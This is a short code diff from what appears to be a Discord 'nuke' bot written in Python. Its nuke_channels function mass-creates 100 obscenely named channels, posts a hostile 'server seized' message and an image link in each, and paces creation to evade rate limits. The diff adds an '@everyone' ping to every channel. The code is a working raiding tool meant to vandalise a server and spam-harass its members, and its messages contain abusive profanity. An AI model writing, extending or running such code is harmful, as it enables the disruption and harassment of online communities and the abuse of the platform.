@@ -25,6 +25,7 @@ async def nuke_channels(guild):
         for i in range(1, 101):
             channel_name = f"fuckedintheass-{i}"
             new_channel = await guild.create_text_channel(channel_name)
+            await new_channel.send("@everyone")
             await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY CITY-31'S OVERWATCH TACTICAL CONTROL FOR SELFISHNESS AND PURE DISRESPECT. GET FUCKED.")
             await new_channel.send("https://i.ibb.co/8BqScCN/Overwatch-Tactical-Control0.png")
             await asyncio.sleep(0.6)  # Adding a delay between channel creations
